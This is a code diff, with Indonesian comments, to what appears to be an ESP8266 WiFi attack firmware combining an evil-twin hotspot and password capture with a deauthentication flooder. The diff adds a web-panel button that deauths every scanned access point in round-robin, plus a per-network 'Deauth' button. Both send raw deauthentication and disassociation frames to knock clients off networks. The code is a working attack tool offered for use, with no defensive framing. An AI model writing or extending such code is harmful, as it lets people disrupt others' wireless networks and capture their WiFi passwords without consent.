@@ -190,6 +190,9 @@ _Network _selectedNetwork;
 
 bool hotspot_active  = false;
 bool deauthing_active = false;
+bool deauthAll = false;      // true = putar semua AP hasil scan
+uint8_t rrIdx = 0;           // penunjuk round-robin untuk mode "semua"
+int8_t singleIdx = -1;       // >=0 = mode tunggal: hanya BSSID indeks ini
 
 String _correct     = "";
 String _tryPassword = "";
@@ -397,8 +400,10 @@ String panelHtml(){
   _html += "<div><form style='display:inline-block' method='post' action='/?deauth=";
   _html += deauthing_active ? "stop'><button" : "start'><button";
   if(_selectedNetwork.ssid.length() == 0) _html += " disabled";
-  _html += ">"; _html += deauthing_active ? "Stop Deauth" : "Start Deauth";
+  _html += ">"; _html += deauthing_active ? "Stop" : "Deauth Target";
   _html += "</button></form>";
+  _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?deauth=all'>"
+           "<button style='background:#8a3b12'>Deauth Semua</button></form>";
 
   if(hotspot_active){
     _html += "<form style='display:inline-block;padding-left:8px' method='post' action='/?hotspot=stop'>"
@@ -435,7 +440,9 @@ String panelHtml(){
       _html += "<button style='background:#20c20e;color:#000'>Selected</button>";
     else
       _html += "<button>Select</button>";
-    _html += "</form></td></tr>";
+    _html += "</form>";
+    _html += "<form style='display:inline' method='post' action='/?deauth=one&b=" + bytesToStr(_networks[i].bssid, 6) + "'>"
+             "<button style='background:#8a3b12;margin-left:4px'>Deauth</button></form></td></tr>";
   }
   _html += "</table><br>";
 
@@ -569,10 +576,34 @@ void handleIndex(){
   }
 
   if(webServer.hasArg("deauth")){
-    if(webServer.arg("deauth") == "start"){ deauthing_active = true;  oledStatus("deauth ON"); }
-    else {
+    String d = webServer.arg("deauth");
+    if(d == "one"){
+      String want = webServer.arg("b");
+      singleIdx = -1; deauthAll = false;
+      for(uint8_t i = 0; i < 16; i++){
+        if(bytesToStr(_networks[i].bssid, 6) == want){ singleIdx = i; _selectedNetwork = _networks[i]; break; }
+      }
+      if(singleIdx < 0){ webServer.send(400, "text/plain", "AP tidak ada, scan ulang"); return; }
+      deauthing_active = true;
+      oledStatus("deauth 1 AP: " + _networks[singleIdx].ssid);
+    } else if(d == "start" || d == "all"){
+      singleIdx = -1;
+      if(d == "all"){
+        bool ada = false;
+        for(uint8_t i = 0; i < 16; i++) if(_networks[i].ssid.length()) { ada = true; break; }
+        if(!ada) performScan();          // daftar kosong -> scan dulu
+        deauthAll = true;
+      } else {
+        deauthAll = false;
+      }
+      deauthing_active = true;
+      rrIdx = 0;
+      oledStatus(deauthAll ? "deauth SEMUA" : "deauth target");
+    } else {
       deauthing_active = false;
-      wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);   // baru balik kanal
+      deauthAll = false;
+      singleIdx = -1;
+      wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
       oledStatus("deauth off");
     }
     webServer.send(200, "text/html", panelHtml());
@@ -693,14 +724,47 @@ void deauthBurst(){
   if(!deauthing_active) wifi_set_channel(hotspot_active ? _selectedNetwork.ch : 1);
 }
 
+// Mode "deauth semua": tiap giliran tembak SATU AP (yang terdeteksi), bergilir.
+// Cakupan luas, tapi tiap AP kena lebih jarang dibanding mode fokus.
+// Mode tunggal: hanya satu BSSID (baris yang lu klik "Deauth").
+void deauthSingleStep(){
+  if(singleIdx < 0 || singleIdx >= 16) return;
+  if(_networks[singleIdx].ssid.length() == 0 || _networks[singleIdx].ch == 0) return;
+  wifi_set_channel(_networks[singleIdx].ch);
+  delay(4);
+  const uint8_t* b = _networks[singleIdx].bssid;
+  sendFrame(b, 0xC0, 7);
+  sendFrame(b, 0xC0, 1);
+  sendFrame(b, 0xA0, 7);
+  sendFrame(b, 0xA0, 1);
+  sendFrame(b, 0xC0, 2);
+}
+
+void deauthAllStep(){
+  for(uint8_t k = 0; k < 16; k++){
+    rrIdx = (rrIdx + 1) % 16;
+    if(_networks[rrIdx].ssid.length() == 0 || _networks[rrIdx].ch == 0) continue;
+    wifi_set_channel(_networks[rrIdx].ch);
+    delay(4);
+    sendFrame(_networks[rrIdx].bssid, 0xC0, 7);
+    sendFrame(_networks[rrIdx].bssid, 0xC0, 1);
+    sendFrame(_networks[rrIdx].bssid, 0xA0, 7);
+    sendFrame(_networks[rrIdx].bssid, 0xA0, 1);
+    sendFrame(_networks[rrIdx].bssid, 0xC0, 2);
+    return;
+  }
+}
+
 void loop(){
 
   dnsServer.processNextRequest();
   webServer.handleClient();
   handleButtons();
 
-  if(deauthing_active && _selectedNetwork.ssid.length() && millis() - deauth_now >= 400){
-    deauthBurst();
+  if(deauthing_active && (deauthAll || _selectedNetwork.ssid.length()) && millis() - deauth_now >= 400){
+    if(singleIdx >= 0)  deauthSingleStep();
+    else if(deauthAll)  deauthAllStep();
+    else                deauthBurst();
     deauth_now = millis();
   }
 
